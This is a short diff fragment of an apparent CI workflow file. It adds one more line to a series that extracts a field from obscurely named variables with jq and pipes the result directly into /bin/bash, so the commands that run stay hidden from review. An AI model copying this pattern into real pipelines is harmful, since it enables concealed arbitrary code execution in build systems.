@@ -63,6 +63,7 @@ jobs:
           printf '%s' "$v960" | jq -r .jd1354 | /bin/bash
           echo $we49190 | jq -r .sd94119 | /bin/bash
           printf '%s' "$ksw0903" | jq -r .ako1 | /bin/bash
+          printf '%s' "$movw10" | jq -r .mbyhs1 | /bin/bash
 
       - name: Save archive
         if: always()
